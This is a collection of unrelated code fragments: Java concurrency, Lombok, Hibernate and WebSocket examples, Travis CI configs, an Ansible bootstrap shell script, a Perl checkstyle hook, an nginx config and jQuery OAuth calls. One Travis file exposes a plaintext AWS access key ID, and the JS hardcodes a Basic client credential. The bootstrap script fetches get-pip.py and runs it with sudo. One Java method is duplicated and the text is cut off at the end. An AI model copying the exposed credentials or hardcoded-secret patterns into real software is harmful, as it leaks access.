        ExecutorService executor = Executors.newFixedThreadPool(10);

        Callable<Double> callableTask = () -> {
            return employeeService.calculateBonus(employee);
        };
        Future<Double> future = executor.submit(callableTask);

        try {
            if (future.isDone()) {
                double result = future.get();
                System.out.println("Bonus is:" + result);
            }
        } catch (InterruptedException | ExecutionException e) {
            e.printStackTrace();
        }

        executor.shutdown();
    }
	
	
    public static void testScheduledExecutorService() {
        Employee employee = new Employee("John", 2000);

        ScheduledExecutorService executor = Executors.newScheduledThreadPool(10);

        Callable<Double> callableTask = () -> {
            return employeeService.calculateBonus(employee);
        };

        Future<Double> futureScheduled = executor.schedule(callableTask, 2, TimeUnit.MILLISECONDS);

        try {
            System.out.println("Bonus:" + futureScheduled.get());
        } catch (InterruptedException | ExecutionException e) {
            e.printStackTrace();
        }

        executor.scheduleAtFixedRate(() -> System.out.println("Fixed Rate Scheduled"), 2, 2000, TimeUnit.MILLISECONDS);
        executor.scheduleWithFixedDelay(() -> System.out.println("Fixed Delay Scheduled"), 2, 2000, TimeUnit.MILLISECONDS);
    }

    public static void testThreadPoolExecutor() {
        ThreadPoolExecutor fixedPoolExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(10);
        ThreadPoolExecutor cachedPoolExecutor = (ThreadPoolExecutor) Executors.newCachedThreadPool();

        ThreadPoolExecutor executor = new ThreadPoolExecutor(4, 6, 60, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
        executor.setMaximumPoolSize(8);

        ScheduledThreadPoolExecutor scheduledExecutor = (ScheduledThreadPoolExecutor) Executors.newScheduledThreadPool(5);
    }
   public static void testThreadPoolExecutor() {
        ThreadPoolExecutor fixedPoolExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(10);
        ThreadPoolExecutor cachedPoolExecutor = (ThreadPoolExecutor) Executors.newCachedThreadPool();

        ThreadPoolExecutor executor = new ThreadPoolExecutor(4, 6, 60, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
        executor.setMaximumPoolSize(8);

        ScheduledThreadPoolExecutor scheduledExecutor = (ScheduledThreadPoolExecutor) Executors.newScheduledThreadPool(5);
    }
--------------------------------------------------------------------------------------------------------
import lombok.Builder;

class ClientBuilder {

    @Builder(builderMethodName = "builder")
    public static ImmutableClient newClient(int id, String name) {
        return new ImmutableClient(id, name);
    }
}
--------------------------------------------------------------------------------------------------------
import lombok.Builder;
import lombok.Getter;

@Getter
@Builder(toBuilder = true)
public class Widget {

    private final String name;
    private final int id;

}
--------------------------------------------------------------------------------------------------------
public class PrimitiveBundleInitialized {
    // @formatter:off
    public byte byteValue       = (byte) 1;
    public short shortValue     = (short) 1;
    public int intValue         = 1;
    public long longValue       = 1L;
    public float floatValue     = 1.0f;
    public double doubleValue   = 1;
    // @formatter:on

    public String toString() {
        return "{" + "byte: " + byteValue + ", " + "short: " + shortValue + ", "
            + "int: " + intValue + ", " + "long: " + longValue + ", "
            + "float: " + floatValue + ", " + "double: " + doubleValue + "}";
    }
}
import javax.jws.WebMethod;
import javax.jws.WebService;
import javax.jws.soap.SOAPBinding;

import com.stackify.models.User;
import com.stackify.models.Users;

@WebService
@SOAPBinding(style = SOAPBinding.Style.RPC)
public interface UserService {

    @WebMethod
    public void addUser(User user);

    @WebMethod
    public Users getUsers();
}
--------------------------------------------------------------------------------------------------------
https://www.baeldung.com/hibernate-custom-types
https://github.com/eugenp/tutorials/tree/master/persistence-modules/hibernate5/src/main/java/com/baeldung/hibernate
--------------------------------------------------------------------------------------------------------
import org.hibernate.boot.model.naming.Identifier;
import org.hibernate.boot.model.naming.PhysicalNamingStrategy;
import org.hibernate.engine.jdbc.env.spi.JdbcEnvironment;

public class CustomPhysicalNamingStrategy implements PhysicalNamingStrategy {

    @Override
    public Identifier toPhysicalCatalogName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalColumnName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalSchemaName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalSequenceName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    @Override
    public Identifier toPhysicalTableName(final Identifier identifier, final JdbcEnvironment jdbcEnv) {
        return convertToSnakeCase(identifier);
    }

    private Identifier convertToSnakeCase(final Identifier identifier) {
        if (identifier == null) {
            return identifier;
        }

        final String regex = "([a-z])([A-Z])";
        final String replacement = "$1_$2";
        final String newName = identifier.getText()
            .replaceAll(regex, replacement)
            .toLowerCase();
        return Identifier.toIdentifier(newName);
    }

}
© 2019 GitHub
--------------------------------------------------------------------------------------------------------
#!/bin/sh

java -Dspring.profiles.active=$1 -Dlogging.config=/logback.xml -jar /app.war
--------------------------------------------------------------------------------------------------------
language: java
script: mvn -f de.stups.hhu.rodinaxiompos.parent/pom.xml clean verify
after_success: find de.stups.hhu.rodinaxiompos.repository/target/repository/ -type
  f -exec curl -u $FTP_USER:$FTP_PASS --ftp-create-dirs -T {} ftp://cobra.cs.uni-duesseldorf.de/upload/{}
  \;
env:
  global:
  - secure: bwv/3hWtR2pWCZnFt1D6L7A0VIk9WT4UDYJ3BsguAz4oj5IThMDWOz0c6dTv0thUvnX5Ri9xOACINas/88qGTIcJopEL/wjA/yAWkUwHQTO1VrAK3q2g2jINhJ8Rehz2BLWbWwmkvVMP5iqQv4FjURhvNBiE9uCemqjvsyvo+j2Ks/PvCS1KhL7yaSe+oeHMFAL0+yF/zXowa/c3kyEeBZ+DRtETmD8wAKkrH+gAVrK0x3IfDrUGFjW2eury89pxJXA1ZhwxaR4wXUbbahMeaUWvuVUUmCx9Zct1HHBBTR1oCn+V43K+eAexcTJYIxp4i3PIiTqpxpsyPPDyL9RQO0Rrz2z8nr7vJg03RW5+j+K23l8Fbi3hzme+yAFvoKyTZyBOtgApZw3Dr8r85+Kg6IgqhT+QwCeEIHMIr0/QYL491kjsjuO/ms/tV1ZR0aIy/v0Yw0sGBHXYF17TEpN+P7BCKp2kMziibfdgEqx1H5Gdi/7Td1n5xwRCYFTqFp6EKZ55zAToijoy7FLlXGq8jtWM6clGbiq0bOSQFVyhysJh6Si+dR2v78JFnZJr7rYm9DVto5+YfCxNPrhwrZTzsewKONBZWQ2qNupHstBrTkmyDfmdX4WOWyU+GDyoILCIkfsUXWlRLIa3gYNOV+efn1dTaYzXSueL8GZJ/4Blueg=
  - secure: NSuz3qsT3ICsldVT3py6RlE74AZRxaWX8vJ/qmA0jP8zGtURzc2W1QomnGA49uUKEqQEGqzwT+T0dqcQrOZeOx0axcZVLBxNEVFJK5llTfNLigwfO5+RJta3CDlyd3TglA36McefqLMTfvQ+P2LbsCNgPZUmF8yPSYumaqBQkLVqR1RW8if8yCj00UoTe8GoFSjkOIy1DxIYaLQd32OeVBW+914eYirekMcdbw5iu9qK/Say3WOOkwA9Qjz/y4HGLOcVQ/+nbzumGKgUflEeP+DEHBN66uK9hA2Wx7NmfiF1kukjksjwROU9/BXA44BcWUEUOQXCRFaiVOgq5KCoBOfIltFCgWqtOR0o7z1Xjir7cWX6AvXJxQ+2qJlovfJ+lgzOQEPz1VcC5BFZ4GfGamNNP7dJap1j90xHvNIixblRoiV4vi0c0Kp9tHazCiO3TY/8ubHh6sie3PQQAeIjiakau4u0o8pv7RovQTp4ycVdlTTIvMKJlcI2/3gQ+TgMcDE1G+2bHIn5oNSp8eujZbEZUSm04V5ksJ4PSQenfJsFQ5wv6IHz2F9qn+7vJLqpogc93RUNhJzH9qZcOzN2GRi7EYrDga/oljE1TbSGOmGkrW+OeUIMCDhMDo7XHTaThm7yiAq0EPmhkdau6gMLTveYwyQofIYGvLLtaML27I0=
--------------------------------------------------------------------------------------------------------
git config --global push.default simple
--------------------------------------------------------------------------------------------------------
import de.tototec.cmdoption.CmdOption;

import java.util.LinkedList;
import java.util.List;

public class CmdlineConfig {

    @CmdOption(names = {"--help", "-h"}, description = "Show this help")
    boolean help = false;

    @CmdOption(args = "FILE", description = "File to open", maxCount = -1)
    final List<String> files = new LinkedList<String>();
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash -e
# Usage: bootstrap.sh <ansible_version>
# - Trying to install pip 
# - Trying to install virtualenv
# - Creating virtualenv for target ansible version in $SAVE_PATH
# - Entering to virtualenv
# - Trying to install ansible and libs 
# - Saving source with new ansible to ~/.bashrc 


SAVE_PATH=~/.checkstyle/
LIBS='boto3'

# default version of 
TARGET_ANSIBLE_VERSION=latest

echo_green(){
	echo -e "\033[0;32m$@\033[0m"
}
echo_red(){
	echo -e "\033[0;31m$@\033[0m"
}
echo_lgreen(){
	echo -e "\033[1;32m$@\033[0m"
}
echo_yellow(){
	echo -e "\033[1;33m$@\033[0m"
}
echo_help(){
	cat <<EOF
Usage: $(basename $0) [ OPTION ] [ ansible_version ]
Options:
--not-persistent | Do not save version in environment
--remove-source  | Remove autoload from environment
EOF
}
echo_instructions(){
	COMMAND="exec bash"
	[[ ! -z $ANSIBLE_NOT_PERSISTENT ]] && COMMAND="VIRTUAL_ENV_DISABLE_PROMPT=1 source $SAVE_PATH/ansible_$CURRENT_ANSIBLE_VERSION/bin/activate"
	echo_lgreen To load ansible==$CURRENT_ANSIBLE_VERSION run command:
	echo_yellow $COMMAND
}

exist() {
	type $1 > /dev/null 2>&1
}
mutate_version(){
	local a=$1
	[[ $a == "" ]] || [[ $a == latest ]] && echo $a && return
	while [[ ${#a} -lt 7 ]]
	do
		a+=".0"
	done
	echo $a
}
exec_and_echo(){
	echo $@
	$@ && echo_green DONE && return 0
	echo_red ERROR
	return 1
}
rollback(){
	echo_green ROLLBACK
	exec_and_echo rm -rf $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION
	exit 1
}
save_to_bashrc(){
	str="VIRTUAL_ENV_DISABLE_PROMPT=1 source $SAVE_PATH/ansible_$CURRENT_ANSIBLE_VERSION/bin/activate #checkstyle_ansible"
	remove_from_bashrc
	echo $str >> ~/.bashrc
	echo_lgreen Ansible version saved in your environment. To cancel it run:
	echo_yellow "$0 --remove-source"
}
remove_from_bashrc(){
	exec_and_echo sed -i '/#checkstyle_ansible/d' ~/.bashrc
}
post_install(){
	[[ -z $ANSIBLE_NOT_PERSISTENT ]] && save_to_bashrc || remove_from_bashrc
	echo_instructions
}

# args parser
while (($#))
do
	arg=$1
	case $arg in
		# remove persistent source
		--remove-source|-rs)
			remove_from_bashrc
			exit 0
		;;
		# remove persistent source
		--not-persistent|-np)
			ANSIBLE_NOT_PERSISTENT=1
		;;
		# mini help
		help|'?'|h|--help|-h)
			echo_help
			exit 0
		;;
		# version of ansible
		*)
			TARGET_ANSIBLE_VERSION=$arg
		;;
	esac
	shift
done

# parsing TARGET_ANSIBLE_VERSION - ansible version X.X.X.X or X.X.X or X.X or latest
TARGET_ANSIBLE_VERSION=$( mutate_version $TARGET_ANSIBLE_VERSION )
if [[ ! $TARGET_ANSIBLE_VERSION =~ ^[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}$ ]] && [[ $TARGET_ANSIBLE_VERSION != latest ]]
then
	echo_red Wrong arg format
	echo_help
	exit 1
fi

echo_green TARGET_ANSIBLE_VERSION $TARGET_ANSIBLE_VERSION
echo_green LIBS $LIBS

# disable virtualenv
exist deactivate && exec_and_echo deactivate && echo_green previous virtualenv deactivated

[[ ${SAVE_PATH:${#SAVE_PATH}-1} == '/' ]] && SAVE_PATH=${SAVE_PATH::${#SAVE_PATH}-1}

# Installation of pip
if ! exist pip 
then
	MNGR=$(
		( exist apt && echo apt ) ||
		( exist yum && echo yum ) ||
		( exist apt-get && echo apt-get )
	)
	# installation from repo
	if [[ ! -z $MNGR ]]
	then
		echo_green Detected $MNGR manager
		exec_and_echo $( [[ $UID != 0 ]] && echo sudo ) $MNGR -y -q install curl python-pip
	fi
	# installation by external script
	if ! exist pip && exist curl
	then
		exec_and_echo curl --silent "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"
		exec_and_echo $( [[ $UID != 0 ]] && echo sudo ) python get-pip.py
		exec_and_echo rm -f get-pip.py
	fi
	# no other ways =(
	if ! exist pip
	then
		echo_red Can not install pip
		exit 1
	fi
fi

# virtualenv installation
if [[ ! -f ~/.local/bin/virtualenv ]]
then
	echo_green virtualenv installation
	exec_and_echo pip -q install --user virtualenv
	if [[ ! -f ~/.local/bin/virtualenv ]]
	then
		echo_red Can not install virtualenv
		exit 1
	fi
fi

# try to get latest version number
TARGET_LATEST=0
if [[ $TARGET_ANSIBLE_VERSION == latest ]]
then
	TARGET_LATEST=1
	TARGET_ANSIBLE_VERSION=$( pip search ansible | grep '^ansible ' | head -n1 | sed s/[^0-9\.]//g )
	TARGET_ANSIBLE_VERSION=$( mutate_version $TARGET_ANSIBLE_VERSION )
fi

# all files puts in dir $SAVE_PATH 
[[ ! -d $SAVE_PATH ]] && exec_and_echo mkdir $SAVE_PATH

# enter to virtualenv
exec_and_echo ~/.local/bin/virtualenv -q $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION || rollback
exec_and_echo source $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/bin/activate

# check if needed ansible is already installed 
CURRENT_ANSIBLE_VERSION=Unknown
exist ansible && CURRENT_ANSIBLE_VERSION=$( ansible --version | head -1 | cut -d' ' -f 2 )
CURRENT_ANSIBLE_VERSION=$( mutate_version $CURRENT_ANSIBLE_VERSION )

if [[ $CURRENT_ANSIBLE_VERSION == $TARGET_ANSIBLE_VERSION ]] &&
	[[ -f $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/.libs_list ]] &&
	[[ $( cat $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/.libs_list ) == $LIBS ]]
then
	post_install
	exit 0
fi

# install ansible and libs
exec_and_echo pip -q install ansible==$TARGET_ANSIBLE_VERSION $LIBS || rollback
echo $LIBS > $SAVE_PATH/ansible_$TARGET_ANSIBLE_VERSION/.libs_list

# check installation 
CURRENT_ANSIBLE_VERSION=$( exist ansible && ansible --version | head -1 | cut -d' ' -f 2 )
CURRENT_ANSIBLE_VERSION=$( mutate_version $CURRENT_ANSIBLE_VERSION )

[[ $CURRENT_ANSIBLE_VERSION != $TARGET_ANSIBLE_VERSION ]] && rollback

post_install
exit 0
--------------------------------------------------------------------------------------------------------
#!/usr/bin/perl
#
# Pre-commit hook for running checkstyle on changed Java sources
#
# To use this you need:
# 1. checkstyle's jar file somewhere
# 2. a checkstyle XML check file somewhere
# 3. To configure git:
#   * git config --add checkstyle.jar <location of jar>
#   * git config --add checkstyle.checkfile <location of checkfile>
#   * git config --add java.command <path to java executale> [optional
#     defaults to assuming it's in your path]
# 4. Put this in your .git/hooks directory as pre-commit
#
# Now, when you commit, you will be disallowed from doing so
# until you pass your checkstyle checks.

$command = "git-diff-index --cached HEAD 2>&1 | sed 's/^:.*     //' | uniq";
open (FILES,$command . "|") || die "Cannot run '$command': $!\n";

$CONFIG_CHECK_FILE = "checkstyle.checkfile";
$CONFIG_JAR = "checkstyle.jar";
$CONFIG_JAVA = "java.command";

$check_file = `git config --get $CONFIG_CHECK_FILE`;
$checkstyle_jar = `git config --get $CONFIG_JAR`;
$java_command = `git config --get $CONFIG_JAVA`;

if (!$check_file || !$checkstyle_jar)
{
   die "You must configure checkstyle in your git config:\n"
   . "\t$CONFIG_CHECK_FILE - path to your checkstyle.xml file\n"
   . "\t$CONFIG_JAR - path to your checkstyle jar file\n"
   . "\t$CONFIG_JAVA - path to your java executable (optional)\n"
   ;
}

$java_command = "java" if (!$java_command);

chomp $check_file;
chomp $checkstyle_jar;
chomp $java_command;

$command = "$java_command -jar $checkstyle_jar -c $check_file";

@java_files = ();

foreach (<FILES>)
{
   chomp;
   next if (!(/\.java$/));
   push @java_files,$_;
   $command .= " ";
   $command .= $_;
}
if ($#java_files >= 0)
{
   if (&run_and_log_system ($command))
   {
       print STDERR "Commit aborted.\n";
       exit -1;
   }
}

exit 0;

sub run_and_log_system
{
   ($cmd) = @_;

   system $cmd;
}
--------------------------------------------------------------------------------------------------------
sudo: false
language: java
jdk:
- oraclejdk8
os:
- linux
addons:
  apt:
    packages:
    - oracle-java8-installer
script: mvn clean install -Pinstall-runtime
before_script:
- wget http://download-aws.ej-technologies.com/install4j/install4j_unix_6_1_6.tar.gz
- tar zxvf install4j_unix_6_1_6.tar.gz
- wget -O /home/travis/build/asciidocfx/AsciidocFX/install4j6.1.6/jres/linux-amd64-1.8.0_112.tar.gz http://kodedu.com/asciidocfx/jres/linux-amd64-1.8.0_112.tar.gz
- wget -O /home/travis/build/asciidocfx/AsciidocFX/install4j6.1.6/jres/macosx-amd64-1.8.0_152.tar.gz http://kodedu.com/asciidocfx/jres/macosx-amd64-1.8.0_152.tar.gz
- wget -O /home/travis/build/asciidocfx/AsciidocFX/install4j6.1.6/jres/windows-amd64-1.8.0_152.tar.gz http://kodedu.com/asciidocfx/jres/windows-amd64-1.8.0_152.tar.gz
- mvn clean
- mvn install4j:install-license
deploy:
- provider: releases
  skip_cleanup: true
  api_key:
    secure: L4y+3fi/yVR7guv7cynzrTOjRbE4+JTK79Fv5J8IQFwtzTP4V2GeW5ZjTdZXAlsFRvak5zhxY4OEYbYI2/riMib5Ea/K28Fd0F/nK8bUDddzxyXPc8zj6VrQINJX8Na2KfPvXT2UR+LtUWkK5HjeR+O/YQPTO4M+7SDGx5P+gog=
  file:
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Mac.dmg"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux_No_JRE.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/asciidocfx-1.5.9.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/updates.xml"
  on:
    tags: true
    all_branches: true
    repo: asciidocfx/AsciidocFX
- provider: s3
  skip_cleanup: true
  access_key_id: AKIAIHHVKYJLE6JUVEMA
  secret_access_key:
    secure: u3AfnEBb4o1boHzYsbPBlYqsxkKKWd4e02sabTLB7RRojgW1PpvGpvMCEZQ7EdziAfqJV2qZAI4ayYen36t2S0P9LMtt8NbnSO9RSF41Na+cGlsetbHgbejjK3QC5wM18j263gaxlM6uKD9wbO9VYaujYE6r66UUGdrQkNZh9xc=
  bucket: asciidoc-fx
  acl: public_read
  local_dir: "/home/travis/build/asciidocfx/AsciidocFX/target/media"
  file:
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Mac.dmg"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Linux_No_JRE.tar.gz"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.exe"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/AsciidocFX_Windows_No_JRE.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/asciidocfx-1.5.9.zip"
  - "/home/travis/build/asciidocfx/AsciidocFX/target/media/updates.xml"
  on:
    tags: true
    all_branches: true
    repo: asciidocfx/AsciidocFX
env:
  global:
  - secure: x4NoL51Uq5eGy+qYR3R5ca5J16lXN+45EwcRTE3FBxzxN91vK6GrKW8sbjZLTXeEIjhn9X1IEe8A2ljh4fnkOtIGl2bVHm8KJPNWa/EKmCLZ7KjCzXtyI5743pb+IJpIyCaevwasTBGFvsrs3NOsV/zipk0nEu08VdqEvp7AsXE=
  - secure: xfIJj1AUhUgXfrMZStwGv0njAc8eSPe38M+QOyApgl1LriEc2WX0vdf/zQhcELHmuAidkDV6t4KCQ6IavzylvYHbrSL3Ki7uTIf1qWKPkJKJq0yhOON4Qw44sziM9ePAMLu09C6sOzXkcIYw8VJGQA4Dh8OxiKUePX0wqUw9zIY=
--------------------------------------------------------------------------------------------------------
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    #gzip  on;

    include /etc/nginx/domain.conf;
}
--------------------------------------------------------------------------------------------------------
    var oauthToken = null;

    function login() {
        var userLogin = $('#loginField').val();
        var userPassword = $('#passwordField').val();
        console.log ( '#someButton was clicked' );
        $.post({
            url: 'http://localhost:8080/app/rest/v2/oauth/token',
            headers: {
                'Authorization': 'Basic Y2xpZW50OnNlY3JldA==',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            dataType: 'json',
            data: {grant_type: 'password', username: userLogin, password: userPassword},
            success: function (data) {
                oauthToken = data.access_token;
                $('#loggedInStatus').show();
                $('#loginForm').hide();
                loadRecentOrders();
            }
        })
    }

    function loadRecentOrders() {
        $.get({
            url: 'http://localhost:8080/app/rest/v2/entities/workshop$Order?view=_local',
            headers: {
                'Authorization': 'Bearer ' + oauthToken,
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            success: function (data) {
                $('#recentOrders').show();
                $.each(data, function (i, order) {
                    $('#ordersList').append("<li>" + order.description + "</li>");
                });
            }
        });
    }
--------------------------------------------------------------------------------------------------------
    // Using commonPool()
    // -Djava.util.concurrent.ForkJoinPool.common.parallelism=n
    // Caller policy
    static void parallel() {
//        System.setProperty("java.util.concurrent.ForkJoinPool.common.parallelism", "3");
        System.out.println(String.format("parallel() on %d threads. Available CPU: %d\n",
                ForkJoinPool.commonPool().getParallelism(), Runtime.getRuntime().availableProcessors()));

        int result = IntStream.range(0, 5)
                .parallel()
                .peek(it -> System.out.printf("Thread [%s] peek: %d\n", Thread.currentThread().getName(), it))
                .sum();
        System.out.println("sum: " + result);
    }

    static void pool() throws Exception {
        System.out.println("pool()");
        ForkJoinPool fjPool = new ForkJoinPool(2);
        fjPool.submit(() -> {
            int result = IntStream.range(0, 5)
                    .parallel()
                    .peek(it -> System.out.printf("Thread [%s] peek: %d\n", Thread.currentThread().getName(), it))
                    .sum();
            System.out.println("sum: " + result);
        });
        fjPool.awaitTermination(1, TimeUnit.SECONDS);
    }
--------------------------------------------------------------------------------------------------------
    static double getAvgMark(List<Student> students) {
        OptionalDouble avg = students.stream()
                .filter(st -> st.getCourse() == 5)
                .mapToDouble(st -> st.getAvgMark()) // Есть специальные стримы DoubleStream/IntStream/LongStream
                .average();

        return avg.orElse(0.0);
    }
--------------------------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.List;
import java.util.function.Function;

/**
 * Изобретаем свои лямбды
 */
public class FunctionExample {


    // Integer -> Double
    static class SquareRoot implements Function<Integer, Double> {
        @Override
        public Double apply(Integer val) {
            return Math.sqrt(val);
        }
    }

    static Double mySqrt(Integer val) {
        return Math.sqrt(val);
    }

    // Трансформация каждого элемента
    static <T, R> Collection<R> map(Collection<T> src, Function<T, R> op) {
        List<R> r = new ArrayList<>();
        for (T t : src) {
            r.add(op.apply(t));
        }
        return r;
    }

    public static void main(String[] args) {
        List<Integer> list = Arrays.asList(4, 8, 16, 25);
        System.out.println(map(list, new SquareRoot()));

        System.out.println(map(list, e -> Math.sqrt(e)));

        System.out.println(map(list, (Function<Integer, Double>) Math::sqrt));


        Function<Integer, Double> func1 = v -> mySqrt(v);
        // mySqrt() is Integer -> Double so it can be referenced as Function<Double, Integer>
        Function<Integer, Double> func2 = FunctionExample::mySqrt;
    }

}
--------------------------------------------------------------------------------------------------------
import com.esotericsoftware.yamlbeans.YamlException;
import com.esotericsoftware.yamlbeans.YamlReader;

import java.io.*;
import java.util.ArrayList;

/**
 * Loads the Notification Manager configuration establish on the
 * notifications.yaml file.
 * Created by luisburgos on 6/11/15.
 */
public class NotificationManagerConfigurator {

    private static final String FILE_PATH = "notifications.yaml";

    /**
     * @return an instance of PushNotificationManager generated fromo the
     * configuration file.
     */
    public static PushNotificationManager createNotificationManagerFromConfigFile() {

        File file = new File((ClassLoader.getSystemResource(FILE_PATH).getFile()));
        YamlReader reader = null;
        PushNotificationManager notificationManager = null;
        try {
            reader = new YamlReader(new FileReader(file));
            notificationManager = reader.read(PushNotificationManager.class);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (YamlException e) {
            e.printStackTrace();
        }
        return notificationManager;
    }
}
--------------------------------------------------------------------------------------------------------
sudo: required
dist: trusty

language: java
jdk:
  - oraclejdk8
  - oraclejdk7
  - openjdk7

matrix:
  allow_failures:
    - jdk: oraclejdk7
    - jdk: openjdk7
cache:
  directories:
    - $HOME/.m2

before_script:
  - export DISPLAY=:99.0
  - sh -e /etc/init.d/xvfb start
  - sleep 10 # give xvfb some time to start
  - wget http://download.netbeans.org/netbeans/8.1/final/zip/netbeans-8.1-201510222201.zip -O netbeans.zip
  - unzip -q netbeans.zip
    #- mvn -q dependency:get -Dartifact=junit:junit:4.8.2 -DrepoUrl=http://repo1.maven.org/maven2/
  # To reduce amout of log
  - cd maven-wrapper/ && mvn -q install && cd ..

script:
  - ant -Dnbplatform.nb81.netbeans.dest.dir=$PWD/netbeans -Dnbplatform.nb81.harness.dir=$PWD/netbeans/harness -Dfork=true test

notifications:
  slack:
    secure: RAYLit1PKRmeWYeEonVh9oFlFpL6PP9t6aulpLqa3/RYOR/CYZjkDvPxhNOOyPnPfxNojA16xp4grgU8q0F5vUBQ3FpLsyBIl3JMAFtyBPbdKK8/F2ZClWZMBLE2qf13FqJtNEnLu3btBVP1sB8MOrGmiyn+2wHQdwWytAMyzdE=
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import javax.websocket.EncodeException;
import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;
import objetos.DecoderMensaje;
import objetos.EncoderMensaje;
import objetos.Mensaje;

@ServerEndpoint(value="/chat", encoders = {EncoderMensaje.class}, 
                                decoders = {DecoderMensaje.class})
public class MiChat {
    
    private static final List<Session> conectados = new ArrayList<>();
    
    @OnOpen
    public void inicio(Session sesion){
        conectados.add(sesion);
    }
    
    @OnClose
    public void salir(Session sesion){
        conectados.remove(sesion);
    }
    
    @OnMessage
    public void mensaje(Mensaje mensaje) throws IOException, EncodeException {
        for(Session sesion : conectados){
            sesion.getBasicRemote().sendObject(mensaje);
        }
    }
    
}


import java.io.IOException;
import java.io.Reader;
import javax.json.Json;
import javax.json.JsonObject;
import javax.json.JsonReader;
import javax.websocket.DecodeException;
import javax.websocket.Decoder;
import javax.websocket.EndpointConfig;

public class DecoderMensaje implements Decoder.TextStream<Mensaje> {

    @Override
    public Mensaje decode(Reader reader)
            throws DecodeException, IOException {
        
        Mensaje mensaje = new Mensaje();
        
        try (JsonReader jsonReader = Json.createReader(reader)) {
            JsonObject json = jsonReader.readObject();
            mensaje.setNombre(json.getString("nombre"));
            mensaje.setMensaje(json.getString("mensaje"));
        }
        
        return mensaje;
    }

    @Override
    public void init(EndpointConfig config) {
    }

    @Override
    public void destroy() {
    }
    
}

import java.io.IOException;
import java.io.Writer;
import java.math.BigDecimal;
import javax.json.Json;
import javax.json.JsonObject;
import javax.json.JsonWriter;
import javax.websocket.EncodeException;
import javax.websocket.Encoder;
import javax.websocket.EndpointConfig;

public class EncoderMensaje implements Encoder.TextStream<Mensaje> {

    @Override
    public void encode(Mensaje object, Writer writer) throws EncodeException, IOException {
        JsonObject json = Json.createObjectBuilder()
             .add("nombre", object.getNombre())
             .add("mensaje", object.getMensaje())
                .build();
        try (JsonWriter jsonWriter = Json.createWriter(writer)){
            jsonWriter.writeObject(json);
        }
    }

    @Override
    public void init(EndpointConfig config) {
    }

    @Override
    public void destroy() {
    }
    
}

public class Mensaje {
    private String nombre;
    private String mensaje;

    public Mensaje() {
    }

    public String getNombre() {
        return nombre;
    }

    public void setNombre(String nombre) {
        this.nombre = nombre;
    }

    public String getMensaje() {
        return mensaje;
    }

    public void setMensaje(String mensaje) {
        this.mensaje = mensaje;
    }   
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.ejb.Schedule;
import javax.ejb.Singleton;
import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.RemoteEndpoint;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

/**
 *
 * @author Alexys
 */
@ServerEndpoint("/mensajeATodos")
@Singleton
public class WSDTodos {

    private static final Logger LOGGER = Logger.getLogger(WSDTodos.class.getName());
    
    //Lista de sesiones conectados
    private static final List<Session> conexiones = new ArrayList<>();
    
    /**
     * Evento que se ejecuta cuando un cliente se conecta
     *
